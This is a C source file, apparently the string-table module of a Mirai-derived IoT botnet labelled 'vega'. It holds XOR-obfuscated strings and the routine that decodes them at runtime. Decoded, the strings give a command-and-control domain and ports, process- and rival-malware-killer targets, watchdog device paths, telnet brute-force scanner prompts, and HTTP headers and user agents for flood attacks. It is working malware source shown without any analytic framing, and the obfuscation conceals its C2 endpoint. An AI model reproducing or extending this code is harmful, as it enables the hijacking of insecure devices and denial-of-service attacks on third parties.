#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xE63A69BC;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{   
        /* exec or nah*/ 
    add_entry(TABLE_EXEC_SUCCESS, "\x71\x51\x71\x5A\x65\x60\x6A\x6C\x71\x51\x71\x71\x5F\x4C\x4E\x48\x27\x09", 18);
    add_entry(TABLE_INSTANCE_EXISTS, "\x5E\x6C\x29\x6E\x66\x7D\x29\x7D\x61\x60\x7A\x29\x7A\x61\x60\x7D\x29\x68\x65\x7B\x6C\x68\x6D\x70\x27\x09", 26);
        /* connections shit */
    add_entry(TABLE_CNC_DOMAIN, "\x6B\x66\x7D\x67\x6C\x7D\x27\x6D\x6C\x71\x6A\x6F\x7E\x27\x6D\x6C\x7F\x09", 18);
    add_entry(TABLE_SCAN_DOMAIN, "\x6B\x66\x7D\x67\x6C\x7D\x27\x6D\x6C\x71\x6A\x6F\x7E\x27\x6D\x6C\x7F\x09", 18);
    add_entry(TABLE_CNC_PORT, "\xE2\x2A", 2);
    add_entry(TABLE_SCAN_CB_PORT, "\xE0\x51",2 );
        /* killer */
    add_entry(TABLE_KILLER_PROC, "\x26\x79\x7B\x66\x6A\x26\x09", 7);
    add_entry(TABLE_KILLER_EXE, "\x26\x6C\x71\x6C\x09", 5);
    add_entry(TABLE_KILLER_FD, "\x26\x6F\x6D\x09", 4);
    add_entry(TABLE_KILLER_MAPS, "\x26\x64\x68\x79\x7A\x09", 6);
    add_entry(TABLE_KILLER_TCP, "\x26\x79\x7B\x66\x6A\x26\x67\x6C\x7D\x26\x7D\x6A\x79\x09", 14);
        /* memorykiller!! */
    add_entry(TABLE_MEM_1, "\x5C\x59\x51\x28\x09", 5);
    add_entry(TABLE_MEM_2, "\x7A\x70\x7A\x7C\x79\x6D\x68\x7D\x6C\x7B\x09", 11);
    add_entry(TABLE_MEM_3, "\x42\x40\x45\x45\x48\x5D\x5D\x42\x09", 9);
    add_entry(TABLE_MEM_4, "\x4B\x46\x4E\x46\x44\x40\x59\x5A\x09", 9);
    add_entry(TABLE_MEM_5, "\x79\x68\x67\x6D\x66\x7B\x68\x09", 8);
    add_entry(TABLE_MEM_6, "\x44\x6C\x7B\x6A\x7C\x7B\x70\x09", 8);
    add_entry(TABLE_MEM_7, "\x6A\x7B\x7A\x6F\x60\x09", 6);
    add_entry(TABLE_MEM_8, "\x68\x61\x7A\x66\x62\x09", 6);
    add_entry(TABLE_MEM_9, "\x5B\x66\x66\x7D\x6C\x6D\x09", 7);
    add_entry(TABLE_MEM_10, "\x5B\x4C\x42\x48\x40\x09", 6);
    add_entry(TABLE_MEM_11, "\x64\x60\x66\x7B\x60\x09", 6);
    add_entry(TABLE_MEM_12, "\x44\x48\x5A\x5C\x5D\x48\x09", 7);
    add_entry(TABLE_MEM_13, "\x4E\x61\x66\x7A\x7D\x5E\x7C\x73\x41\x6C\x7B\x6C\x3F\x3F\x3F\x09", 16);
    add_entry(TABLE_MEM_14, "\x4A\x66\x7B\x66\x67\x68\x09", 7);
    add_entry(TABLE_MEM_15, "\x65\x66\x65\x60\x6E\x68\x67\x6E\x09", 9);
    add_entry(TABLE_MEM_16, "\x65\x66\x65\x71\x6D\x09", 6);
    add_entry(TABLE_MEM_17, "\x47\x60\x4E\x4E\x6C\x5B\x3F\x30\x71\x6D\x09", 11);
    add_entry(TABLE_MEM_18, "\x67\x7C\x6A\x65\x6C\x68\x7B\x09", 8);
    add_entry(TABLE_MEM_19, "\x6D\x7F\x7B\x41\x6C\x65\x79\x6C\x7B\x09", 10);
    add_entry(TABLE_MEM_20, "\x70\x68\x62\x7C\x73\x68\x09", 7);
    add_entry(TABLE_MEM_21, "\x5C\x67\x41\x48\x67\x68\x48\x5E\x09", 9);
    add_entry(TABLE_MEM_22, "\x48\x7B\x6C\x7A\x09", 5);
    add_entry(TABLE_MEM_23, "\x65\x6C\x7A\x7A\x60\x6C\x27\x09", 8);
    add_entry(TABLE_MEM_24, "\x41\x60\x65\x60\x71\x09", 6);
    add_entry(TABLE_MEM_25, "\x5B\x6C\x68\x79\x6C\x7B\x27\x09", 8);
    add_entry(TABLE_MEM_26, "\x48\x65\x6C\x71\x09", 5);
    add_entry(TABLE_MEM_27, "\x7A\x66\x7B\x68\x09", 5);
    add_entry(TABLE_MEM_28, "\x48\x64\x68\x62\x68\x67\x66\x09", 8);
    add_entry(TABLE_MEM_29, "\x7B\x73\x7B\x09", 4);
    add_entry(TABLE_MEM_30, "\x67\x70\x68\x09", 4);
    add_entry(TABLE_MEM_31, "\x64\x6C\x73\x70\x09", 5);
    add_entry(TABLE_MEM_32, "\x73\x61\x7B\x09", 4);
    add_entry(TABLE_MEM_33, "\x65\x73\x7B\x6D\x09", 5);
    add_entry(TABLE_MEM_34, "\x4E\x7C\x64\x64\x70\x09", 6);
    add_entry(TABLE_MEM_35, "\x44\x66\x73\x60\x09", 5);
    add_entry(TABLE_MEM_36, "\x50\x68\x62\x7C\x73\x68\x09", 7);
    add_entry(TABLE_MEM_37, "\x6D\x68\x6D\x6D\x70\x65\x3A\x3A\x7D\x09", 10);
    add_entry(TABLE_MEM_38, "\x27\x7C\x67\x3C\x09", 5);
    add_entry(TABLE_MEM_39, "\x4D\x6C\x64\x66\x67\x27\x09", 7);
    add_entry(TABLE_MEM_40, "\x46\x62\x68\x64\x60\x09", 6);
            /* watchdog */
    add_entry(TABLE_MISC_WATCHDOG_1, "\x26\x6D\x6C\x7F\x26\x7E\x68\x7D\x6A\x61\x6D\x66\x6E\x09", 14);
    add_entry(TABLE_MISC_WATCHDOG_2, "\x26\x6D\x6C\x7F\x26\x64\x60\x7A\x6A\x26\x7E\x68\x7D\x6A\x61\x6D\x66\x6E\x09", 19);
    add_entry(TABLE_MISC_WATCHDOG_3, "\x26\x6D\x6C\x7F\x26\x4F\x5D\x5E\x4D\x5D\x38\x39\x38\x56\x7E\x68\x7D\x6A\x61\x6D\x66\x6E\x09", 23);
    add_entry(TABLE_MISC_WATCHDOG_4, "\x26\x6D\x6C\x7F\x26\x4F\x5D\x5E\x4D\x5D\x38\x39\x38\x55\x29\x7E\x68\x7D\x6A\x61\x6D\x66\x6E\x09", 24);
            /* scanner */
    add_entry(TABLE_SCAN_SHELL, "\x7A\x61\x6C\x65\x65\x09", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x6C\x67\x68\x6B\x65\x6C\x09", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x7A\x70\x7A\x7D\x6C\x64\x09", 7);
    add_entry(TABLE_SCAN_SH, "\x7A\x61\x09", 3);
    add_entry(TABLE_SCAN_QUERY, "\x26\x6B\x60\x67\x26\x6B\x7C\x7A\x70\x6B\x66\x71\x29\x5F\x3A\x4E\x3D\x09", 18);
    add_entry(TABLE_SCAN_RESP, "\x5F\x3A\x4E\x3D\x33\x29\x68\x79\x79\x65\x6C\x7D\x29\x67\x66\x7D\x29\x6F\x66\x7C\x67\x6D\x09", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x67\x6A\x66\x7B\x7B\x6C\x6A\x7D\x09", 9);
    add_entry(TABLE_SCAN_OGIN, "\x68\x7A\x7A\x7E\x66\x7B\x6D\x09", 8);
    add_entry(TABLE_SCAN_ASSWORD, "\x66\x6E\x60\x67\x09", 5);
    add_entry(TABLE_SCAN_ENTER, "\x6C\x67\x7D\x6C\x7B\x09", 6);
        /* attack */
    add_entry(TABLE_ATK_RESOLVER, "\x26\x6C\x7D\x6A\x26\x7B\x6C\x7A\x66\x65\x7F\x27\x6A\x66\x67\x6F\x09", 17);    
    add_entry(TABLE_ATK_NSERV, "\x67\x68\x64\x6C\x7A\x6C\x7B\x7F\x6C\x7B\x09", 11);
    add_entry(TABLE_ATK_KEEP_ALIVE, "\x4A\x66\x67\x67\x6C\x6A\x7D\x60\x66\x67\x33\x29\x62\x6C\x6C\x79\x24\x68\x65\x60\x7F\x6C\x09", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x48\x6A\x6A\x6C\x79\x7D\x33\x29\x7D\x6C\x71\x7D\x26\x61\x7D\x64\x65\x25\x68\x79\x79\x65\x60\x6A\x68\x7D\x60\x66\x67\x26\x71\x61\x7D\x64\x65\x22\x71\x64\x65\x25\x68\x79\x79\x65\x60\x6A\x68\x7D\x60\x66\x67\x26\x71\x64\x65\x32\x78\x34\x39\x27\x30\x25\x60\x64\x68\x6E\x6C\x26\x7E\x6C\x6B\x79\x25\x23\x26\x23\x32\x78\x34\x39\x27\x31\x09", 83);    
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x48\x6A\x6A\x6C\x79\x7D\x24\x45\x68\x67\x6E\x7C\x68\x6E\x6C\x33\x29\x6C\x67\x24\x5C\x5A\x25\x6C\x67\x32\x78\x34\x39\x27\x31\x09", 32);    
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x4A\x66\x67\x7D\x6C\x67\x7D\x24\x5D\x70\x79\x6C\x33\x29\x68\x79\x79\x65\x60\x6A\x68\x7D\x60\x66\x67\x26\x71\x24\x7E\x7E\x7E\x24\x6F\x66\x7B\x64\x24\x7C\x7B\x65\x6C\x67\x6A\x66\x6D\x6C\x6D\x09", 48);    
    add_entry(TABLE_ATK_SET_COOKIE, "\x7A\x6C\x7D\x4A\x66\x66\x62\x60\x6C\x21\x2E\x09", 12);    
    add_entry(TABLE_ATK_REFRESH_HDR, "\x7B\x6C\x6F\x7B\x6C\x7A\x61\x33\x09", 9);    
    add_entry(TABLE_ATK_LOCATION_HDR, "\x65\x66\x6A\x68\x7D\x60\x66\x67\x33\x09", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x7A\x6C\x7D\x24\x6A\x66\x66\x62\x60\x6C\x33\x09", 12);    
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x6A\x66\x67\x7D\x6C\x67\x7D\x24\x65\x6C\x67\x6E\x7D\x61\x33\x09", 16);    
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x7D\x7B\x68\x67\x7A\x6F\x6C\x7B\x24\x6C\x67\x6A\x66\x6D\x60\x67\x6E\x33\x09", 19);    
    add_entry(TABLE_ATK_CHUNKED, "\x6A\x61\x7C\x67\x62\x6C\x6D\x09", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x62\x6C\x6C\x79\x24\x68\x65\x60\x7F\x6C\x09", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x6A\x66\x67\x67\x6C\x6A\x7D\x60\x66\x67\x33\x09", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x7A\x6C\x7B\x7F\x6C\x7B\x33\x29\x6D\x66\x7A\x68\x7B\x7B\x6C\x7A\x7D\x09", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x7A\x6C\x7B\x7F\x6C\x7B\x33\x29\x6A\x65\x66\x7C\x6D\x6F\x65\x68\x7B\x6C\x24\x67\x6E\x60\x67\x71\x09", 25);
    add_entry(TABLE_ATK_HTTP, "\x41\x5D\x5D\x59\x26\x38\x27\x38\x09", 9);
    add_entry(TABLE_ATK_USERAGENT, "\x5C\x7A\x6C\x7B\x24\x48\x6E\x6C\x67\x7D\x33\x09", 12);    
    add_entry(TABLE_ATK_HOST, "\x41\x66\x7A\x7D\x33\x09", 6);
    add_entry(TABLE_ATK_COOKIE, "\x4A\x66\x66\x62\x60\x6C\x33\x09", 8);    
    add_entry(TABLE_ATK_SEARCHHTTP, "\x61\x7D\x7D\x79\x09", 5);    
    add_entry(TABLE_ATK_URL, "\x7C\x7B\x65\x34\x09", 5);
    add_entry(TABLE_ATK_POST, "\x59\x46\x5A\x5D\x09", 5);    
        /* UA */
    add_entry(TABLE_HTTP_1, "\x44\x66\x73\x60\x65\x65\x68\x26\x3C\x27\x39\x29\x21\x44\x68\x6A\x60\x67\x7D\x66\x7A\x61\x32\x29\x40\x67\x7D\x6C\x65\x29\x44\x68\x6A\x29\x46\x5A\x29\x51\x29\x38\x39\x56\x38\x38\x56\x3F\x20\x29\x48\x79\x79\x65\x6C\x5E\x6C\x6B\x42\x60\x7D\x26\x3F\x39\x38\x27\x3E\x27\x3E\x29\x21\x42\x41\x5D\x44\x45\x25\x29\x65\x60\x62\x6C\x29\x4E\x6C\x6A\x62\x66\x20\x29\x5F\x6C\x7B\x7A\x60\x66\x67\x26\x30\x27\x38\x27\x3B\x29\x5A\x68\x6F\x68\x7B\x60\x26\x3F\x39\x38\x27\x3E\x27\x3E\x09", 117);
    add_entry(TABLE_HTTP_2, "\x44\x66\x73\x60\x65\x65\x68\x26\x3C\x27\x39\x29\x21\x5E\x60\x67\x6D\x66\x7E\x7A\x29\x47\x5D\x29\x38\x39\x27\x39\x32\x29\x5E\x60\x67\x3F\x3D\x32\x29\x71\x3F\x3D\x20\x29\x48\x79\x79\x65\x6C\x5E\x6C\x6B\x42\x60\x7D\x26\x3C\x3A\x3E\x27\x3A\x3F\x29\x21\x42\x41\x5D\x44\x45\x25\x29\x65\x60\x62\x6C\x29\x4E\x6C\x6A\x62\x66\x20\x29\x4A\x61\x7B\x66\x64\x6C\x26\x3F\x3B\x27\x39\x27\x3A\x3B\x39\x3B\x27\x31\x30\x29\x5A\x68\x6F\x68\x7B\x60\x26\x3C\x3A\x3E\x27\x3A\x3F\x09", 115);
    add_entry(TABLE_HTTP_3, "\x44\x66\x73\x60\x65\x65\x68\x26\x3C\x27\x39\x29\x21\x5E\x60\x67\x6D\x66\x7E\x7A\x29\x47\x5D\x29\x3F\x27\x38\x32\x29\x5E\x46\x5E\x3F\x3D\x20\x29\x48\x79\x79\x65\x6C\x5E\x6C\x6B\x42\x60\x7D\x26\x3C\x3A\x3E\x27\x3A\x3F\x29\x21\x42\x41\x5D\x44\x45\x25\x29\x65\x60\x62\x6C\x29\x4E\x6C\x6A\x62\x66\x20\x29\x4A\x61\x7B\x66\x64\x6C\x26\x3D\x31\x27\x39\x27\x3B\x3C\x3F\x3D\x27\x38\x39\x30\x29\x5A\x68\x6F\x68\x7B\x60\x26\x3C\x3A\x3E\x27\x3A\x3F\x09", 110);
    add_entry(TABLE_HTTP_4, "\x44\x66\x73\x60\x65\x65\x68\x26\x3C\x27\x39\x29\x21\x5E\x60\x67\x6D\x66\x7E\x7A\x29\x47\x5D\x29\x3F\x27\x3A\x32\x29\x5E\x46\x5E\x3F\x3D\x32\x29\x7B\x7F\x33\x3C\x39\x27\x39\x20\x29\x4E\x6C\x6A\x62\x66\x26\x3B\x39\x38\x39\x39\x38\x39\x38\x29\x4F\x60\x7B\x6C\x6F\x66\x71\x26\x3C\x39\x27\x39\x09", 73);
    add_entry(TABLE_HTTP_5, "\x44\x66\x73\x60\x65\x65\x68\x26\x3C\x27\x39\x29\x21\x5E\x60\x67\x6D\x66\x7E\x7A\x29\x47\x5D\x29\x3F\x27\x3A\x32\x29\x5E\x46\x5E\x3F\x3D\x20\x29\x48\x79\x79\x65\x6C\x5E\x6C\x6B\x42\x60\x7D\x26\x3C\x3A\x3E\x27\x3A\x3F\x29\x21\x42\x41\x5D\x44\x45\x25\x29\x65\x60\x62\x6C\x29\x4E\x6C\x6A\x62\x66\x20\x29\x4A\x61\x7B\x66\x64\x6C\x26\x3C\x38\x27\x39\x27\x3B\x3E\x39\x3D\x27\x38\x39\x3F\x29\x5A\x68\x6F\x68\x7B\x60\x26\x3C\x3A\x3E\x27\x3A\x3F\x09", 110);
        /* fuckthisworld */
    add_entry(TABLE_RANDOM, "\x68\x6B\x6A\x6D\x6C\x6F\x6E\x61\x60\x63\x62\x65\x64\x67\x66\x79\x78\x7B\x7A\x7D\x7C\x7F\x7E\x71\x70\x73\x38\x3B\x3A\x3D\x3C\x3F\x3E\x31\x30\x39\x09", 37);

}


void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[vega/table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[vega/table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[vega/table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
